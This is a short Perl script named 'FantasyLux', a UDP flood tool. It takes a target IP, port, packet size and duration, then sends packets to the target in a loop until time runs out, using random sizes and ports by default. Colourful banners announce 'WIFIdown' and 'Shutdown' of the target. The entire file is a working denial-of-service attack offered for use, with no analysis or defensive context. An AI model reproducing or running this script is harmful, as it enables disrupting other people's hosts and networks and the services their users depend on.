#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##############
# FantasyLux
##############

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD GREEN<<EOTEXT;
                      .
                      00
                      000
                     00000                  .
                     000000                00
      .             0000000              0000
      0000          0000000            00000
      00000         00000000          000000
       000000       00000000        0000000
        0000000     00000000      000000000
        0000000      0000000     000000000
         0000000     00000000   000000000
           000000000  0000000   00000000
             0000000   000000  0000000            .
              000000  00000  0000000        000000
   .           000000  0000  000000    000000000
    0000000     000000 000   0000   00000000000
     0000000000   0000  00  0000  00000000000
       00000000000  000 00 000  0000000000
          00000000000 00 0 0  000000000
             00000000000000 0000
                      000000000
                    000     000000                                                                                                                                                                                 
EOTEXT

print "\033[0;35m[\033[1;35mLIGHTING\033[1;m]\033[1;35m\nLIGHTING .. THE .. BLUNT..\[\033[0;36mBLUNT IS LIT\033[0;36m]\n\033[1;36mWIFIdown \033[0;36m$ip..\033[1;m";
sleep 1;
print "\n\033[0;32mShutdown \033[1;32m$ip..\033[1;m"; 

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));} 